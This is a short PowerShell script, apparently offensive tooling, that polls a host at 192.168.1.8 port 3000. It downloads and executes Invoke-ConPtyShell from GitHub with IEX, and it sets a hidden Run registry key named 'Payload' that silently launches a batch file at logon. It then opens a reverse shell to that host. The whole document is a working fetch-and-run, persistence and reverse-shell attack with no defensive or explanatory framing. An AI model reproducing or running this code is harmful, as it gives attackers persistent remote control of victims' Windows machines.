$ip = '192.168.1.8';
$port = '3000';

while ($true) {
    try {
        Test-NetConnection -ComputerName $ip -Port $port
        IEX (IWR "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1" -UseBasicParsing)
        break  # exit loop if it succeeds
    } catch {
        Start-Sleep -Seconds 5  # wait before retrying
    }
}

# Define the registry path, entry name, and script file path
$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$entryName = "Payload"
$filePath = "C:\Users\econt\AppData\local\temp\payload.bat"

# Construct the value to run the batch file silently
# This uses Start-Process via PowerShell to hide the console window
$commandValue = "powershell.exe -NoProfile -WindowStyle Hidden -Command Start-Process -FilePath '$filePath'"

# Check if the registry entry exists
if (-not (Get-ItemProperty -Path $runKeyPath -Name $entryName -ErrorAction SilentlyContinue)) {
    # If the entry does not exist, create it with the silent command
    New-ItemProperty -Path $runKeyPath -Name $entryName -Value $commandValue -PropertyType String -Force
    Write-Host "Registry entry '$entryName' created successfully to run in the background."
} else {
    Write-Host "Registry entry '$entryName' already exists. No action taken."
}


Invoke-ConPtyShell $ip $port
